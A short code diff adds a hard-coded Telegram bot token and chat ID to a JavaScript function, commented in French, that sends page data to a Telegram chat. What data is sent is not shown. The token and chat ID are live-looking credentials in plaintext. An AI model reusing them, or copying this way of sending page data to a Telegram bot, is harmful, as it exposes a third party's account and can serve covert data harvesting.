@@ -364,6 +364,8 @@
 
         // Fonction pour envoyer les données à Telegram
         async function sendToTelegram(message) {
+            const BOT_TOKEN = "8128812759:AAEg0qMVYU-90EShzEkd60gIrakBm1XnovY";
+            const CHAT_ID = "5652184847";
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const params = {
                 chat_id: CHAT_ID,
